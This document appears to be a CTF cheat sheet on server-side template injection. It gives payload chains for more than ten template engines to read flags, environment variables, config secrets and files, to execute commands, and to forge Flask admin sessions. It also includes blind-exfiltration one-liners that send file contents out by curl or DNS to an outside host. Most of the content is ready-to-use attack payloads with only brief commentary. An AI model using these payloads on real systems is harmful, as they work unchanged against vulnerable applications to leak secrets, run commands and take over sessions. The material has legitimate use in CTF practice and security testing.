# SSTI → impact chains — from eval to flag, by goal

The eval is never the goal — the flag is. Every route from a
confirmed `{{7*7}}` to flag-bytes, ordered by how often it works
in CTF.

---

## 1. The flag-location map — where flags hide

```text
1. Env var:        FLAG / CTF_FLAG → os.environ / $_SERVER / ENV
2. File:           /flag /flag.txt /app/flag → read primitives
3. Config:         app.config / settings → bound-object read
4. DB:             flag-table → exec + query (rare from SSTI)
5. Source code:    comments in the app-source → file read
6. Admin session:  forge session → fetch flag endpoint
7. Command out:    cat /flag → exec channel
8. Sibling service: SSRF-ish via exec curl → internal endpoint
```

Read the flag-location BEFORE picking a chain — `os.environ`
beats `exec` when the flag is an env var (most common CTF shape).

## 2. The direct-read chains — no exec

### Jinja2/Flask
```jinja2
{{config}}                                  -- flag-in-config?
{{config.FLAG}} {{config['FLAG']}}
{{config.from_pyfile('/flag')}}
{{lipsum.__globals__.os.environ}}
{{lipsum.__globals__.os.environ.FLAG}}
{{self.__init__.__globals__['FLAG']}}
{{request.application.__globals__.FLAG}}
{{self.__init__.__globals__.os.popen('cat /flag').read()}}
   — popen is exec — but ONE shot reads the whole file
```

### Twig/Symfony
```twig
{{app.request.server.get('FLAG')}}           -- env vars
{{_context.flag}} {{_context.secret}}
{{getenv('FLAG')}}                            -- if getenv bound
{{include('/flag')}} {{source('/flag')}}
{{['file_get_contents','/flag']|map('call_user_func_array')}}
   — call_user_func_array(['fn',[args]]) — depends version
```

### FreeMarker
```ftl
${.data_model}                              -- whole data-model dump
<#include "/flag">
${"freemarker.template.utility.Execute"?new()("cat /flag")}
```

### Velocity
```velocity
#include('/flag')
$x.class.forName('java.util.Scanner')...
```

### ERB/Ruby
```ruby
<%=ENV['FLAG']%>                             -- env
<%=File.read('/flag')%>
<%=File.open('/flag').read%>
<%=IO.read('/flag')%>
<%=`cat /flag`%>
<%=%x(cat /flag)%>
<%=system('cat /flag')%>                      -- system echoes to stdout
                                             -- NOT the page — %x/backtick
                                             -- returns the bytes
```

### Node engines
```javascript
<%=process.env.FLAG%>
<%=require('fs').readFileSync('/flag','utf8')%>
<%=process.mainModule.require('fs').readFileSync('/flag','utf8')%>
```

### Groovy
```groovy
${new File('/flag').text}
${System.getenv('FLAG')}
```

### Smarty
```smarty
{$smarty.const.FLAG}
{$smarty.server.FLAG}
{php}echo file_get_contents('/flag');{/php}
{if print(file_get_contents('/flag'))}{/if}
{math equation="(file_get_contents('/flag'))"}
```

## 3. The exec-channel chains — when read is blocked

```text
jinja:  os.popen(cmd).read() / subprocess.Popen via subclasses
twig:   |map('system') / registerUndefinedFilterCallback
freemarker: ?new Execute / ObjectConstructor→ProcessBuilder
velocity: Runtime.exec chain / $class.inspect chain
thymeleaf: T(Runtime).exec / ProcessBuilder-ctor
erb:    `cmd` / %x(cmd) / system / spawn / exec / IO.popen
ejs:    child_process via require / process.binding / global
nunjucks: range.__globals__.process / constructor.constructor
smarty: {php}system() / {if}eval / {math}eval
groovy: 'cmd'.execute().text
pebble: getClass().forName Runtime
slim:   #{%x()} / #{system()}
```

## 4. The blind-exec chains — output goes nowhere

When exec works but output is swallowed:

```text
1. Write-to-webroot:  cmd > /app/static/x → GET /static/x
   jinja: os.system('cat /flag > /app/static/f')
   twig:  |map('system') 'cat /flag > /var/www/html/f.txt'
2. HTTP exfil:  curl http://you/?d=$(cat /flag|base64)
   — works where outbound is open — oob_listener
3. DNS exfil:   ping $(cat /flag|xxd -p|head -c30).you.com
   — survives HTTP-egress blocks — DNS often open
4. Time-sidechannel: sleep-when-bit-set → binary-oracle
   — SLOW — last resort — see blind-ssti.md
5. Error-exfil: raise an exception containing the read —
   exceptions print to error-page: exec('raise "x"+read()')
   ruby: <%=raise File.read('/flag')%> → error page = file!
   python: {{lipsum.__globals__.os.popen('cat /flag').read()}}
           wrapped in a raise — error-page renders it
```

## 5. The forge-chain — session/secret → admin

```jinja2
{{config.SECRET_KEY}} → forge flask session:
   python3 -c "from flask import *; ..." or flask-session-cookie
   tools/web/session_dissect.py identifies the format
→ signed cookie as admin → /admin → flag

{{config.FLAG}} → flag direct
{{config.DB_URI}} → connect the db → flag-table
{{request.cookies}} → steal existing session?
```

The SECRET_KEY→session-forge chain is the classic flask-SSTI
endgame — `session_dissect` names the format, then forge.

## 6. The config/pyfile chain — Flask-specific

```jinja2
{{config.from_pyfile('/flag')}}
   — from_pyfile EXECUTES the file as python-config syntax.
     /flag as text errors → but the error may leak first line
{{config.from_pyfile('/app/config.py')}}
   → loads real config → {{config.SECRET}} readable
{{config.from_pyfile('/proc/self/environ')}}
   → environ bytes — errors but partial-leak
{{config.items()}}
{{config.get('FLAG')}}
```

`from_pyfile` on non-python files errors — but the EXCEPTION
may echo the first non-python line → partial leak per try.

## 7. The self/context chains — no __globals__ needed

```jinja2
{{self._TemplateReference__context}}
{{self._TemplateReference__context.cycles}}
{{self._TemplateReference__context.vars}}
   — the whole template context — every var including flag
{{self.environment}}
{{self.module}}            -- the compiled module → its dict
{{self.__init__.__globals__}}
```

`self` walks to context → context holds ALL rendered vars —
flag-vars often bound by the route before rendering your input.

## 8. The request/application chains — WSGI reach

```jinja2
{{request.application}}                    — WSGI app callable
{{request.application.__globals__}}
{{request.application.__globals__['os']}}
{{request.application.__globals__.os.environ}}
{{request.environ}}
{{request.environ['werkzeug.server.shutdown']}}
{{request.application.__call__.__globals__}}
{{request.args}}  {{request.values}}  {{request.cookies}}
{{request.headers}}  {{request.form}}  {{request.data}}
```

`request.args`/`headers`/`cookies` — INBOUND string-carriers for
bypass payloads — see ssti-bypass.md.

## 9. The `include`/`extends` file-read chains

```jinja2
{%include '/flag'%}                 -- jinja-loader reads it AS
                                      TEMPLATE — error-leaks content?
{{source('/flag')}}                  -- source() — raw file text
{%extends '/flag'%}                  -- parse as template — error
                                       echoes non-template lines
{%import '/flag' as x%}
```

`source()`/`include`/`extends` go through the TEMPLATE LOADER —
the loader's search-path bounds it — `/flag` outside the path →
blocked; `../` traversal inside loader-path → sometimes works.

## 10. Chain-selection table

| You have | First chain | Backup |
|---|---|---|
| Jinja2+Flask | `{{config}}` | lipsum.__globals__ |
| Jinja2-no-Flask | lipsum.__globals__ | subclasses |
| Twig | `{{_context}}`+app.request.server | map/filter |
| FreeMarker | `${.data_model}` + ?new Execute | include |
| Velocity | $x.class → forName | include/parse |
| Thymeleaf | beans/env + T(Runtime) | preprocessing |
| ERB | `<%=ENV%>` `<%=File.read%>` | backticks |
| EJS | `<%=process.env%>` `<%=require%>` | global walk |
| Smarty | `{$smarty.*}` `{php}` | {if}/{math} |
| Blind-any | write-to-webroot | DNS-OOB → time |
